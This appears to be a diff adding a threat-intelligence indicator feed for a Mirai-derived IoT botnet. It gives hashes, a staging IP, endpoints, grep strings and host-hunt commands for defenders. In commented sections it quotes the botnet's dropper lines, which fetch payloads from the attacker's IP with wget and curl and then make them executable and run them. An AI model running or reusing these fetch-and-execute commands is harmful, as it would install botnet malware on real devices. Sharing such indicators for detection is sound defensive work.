@@ -1,0 +1,72 @@
+# ==============================================================
+# MIRAI_OHSHIT — IOC Feed
+# Author   : AfterPacket
+# Captured : 2026-08-04T07:42:55Z .. 2026-08-07T19:04:06Z
+# TLP      : TLP:WHITE
+# Source   : Drosera honeypot / static analysis
+# ==============================================================
+#
+# NOTE: MD5 and SHA-1 are not listed. The analysis host could not
+# execute hashing tools against the samples; only the SHA-256
+# recorded by the honeypot sidecar is available. Do not infer
+# absence of a hash as a property of the sample.
+
+# [HASHES — SHA-256]
+# Stage 1 — one-line fetcher, written to /tmp/.p over telnet
+de9cfdf7d1330534731e8354ec5927db99e06365850a8fe1d07c6bf8dec97ad0   # /tmp/.p, 104 B
+# Stage 2 — multi-arch loader
+8b1a2fb6b358484b7769aeeb63209f2b277d91b5015cf28ce471a67e0ef83d28   # /ohshit.sh, 2527 B
+# Stage 3 — ELF payloads (7 of 16 architectures captured)
+81ea2a392b6d71c7cd381f48ebffb992457a1d3897d1484a3fd7823f2e9f69a3   # //bot.arm7,   727832 B
+15b950d6b732fba9021b829331a2277c1d88609b60b4238a34fcbfea676f465d   # //bot.sh4,    891044 B
+78a57de8eb7d70af3d44dda3ea3fc11ed44879d34db45fb8c22211b852398763   # //bot.arm,    956852 B
+7b8add306d87da91ed1ff4608ad8f829c83f6035cbc852c73869ec66977d93f8   # //bot.mips,  1121448 B
+98994017c070389b3ddfe557847dc6aaa00ce7bc79760faf3dcfe68036b56431   # //bot.ppc,   1185928 B
+2ae7dc16ca036cb5c2c7ce2cd8099edb07d96b8846188c92eb39a7feba2fec08   # //bot.i686,  1206876 B
+9d7cd4948a1fcbaeadc425752fce9a933bd6fc41eeede030dffd7b99b3bc51d5   # //bot.x86_64,1357648 B
+
+# [IP ADDRESSES]
+# Confidence: HIGH — direct honeypot capture (telnet) AND hardcoded payload host
+94.154.43.123   # dropper delivery + serves /ohshit.sh and //bot.<arch>
+
+# [DOMAINS]
+# None. This family uses a bare IP for all staging.
+
+# [PORTS]
+80    # HTTP — payload retrieval from 94.154.43.123
+
+# [HTTP INDICATORS]
+# Endpoint: http://94.154.43.123/ohshit.sh
+# Endpoint: http://94.154.43.123//bot.<arch>   <- note the DOUBLED SLASH
+# The doubled slash after the host is a reliable, low-noise detection string.
+
+# [CAMPAIGN METADATA]
+# Family      : MIRAI_OHSHIT (Mirai-derived multi-arch IoT botnet)
+# Stage 1     : /tmp/.p written directly over telnet (shell-write)
+# Stage 2     : /ohshit.sh, staged in /tmp/ via busybox
+# Staging file: WTF  (payload cat'd into this name, then chmod +x *, then ./WTF)
+# Architectures attempted (16):
+#   x86 mips arc i468 i686 x86_64 mpsl arm arm5 arm6 arm7 ppc spc m68k sh4
+# Captured 7 of 16 — arm, arm7, sh4, mips, i686, ppc, x86_64
+# VirusTotal  : no VT record for any sample in this family at capture time
+#               (sidecar scan is null — this is absence of data, NOT a clean verdict)
+
+# [FULL STAGE-1 CONTENT]
+# wget -q http://94.154.43.123/ohshit.sh -O ohshit.sh 2>/dev/null; sh ohshit.sh; rm -rf ohshit.sh
+
+# [STAGE-2 LOOP BODY, per architecture]
+# wget http://94.154.43.123//bot.<arch>; curl -O http://94.154.43.123//bot.<arch>;\
+#   cat bot.<arch> >WTF;chmod +x *;./WTF
+
+# [HOST-BASED GREP STRINGS]
+# "94.154.43.123"
+# "ohshit.sh"
+# "//bot."
+# "cat bot."
+# ">WTF"
+# "chmod +x *;./WTF"
+
+# [HOST HUNT]
+# grep -rl "94.154.43.123" /tmp /var/tmp /home /root 2>/dev/null
+# ls -la /tmp/.p /tmp/WTF /tmp/bot.* 2>/dev/null
+# find / -name "WTF" -type f 2>/dev/null
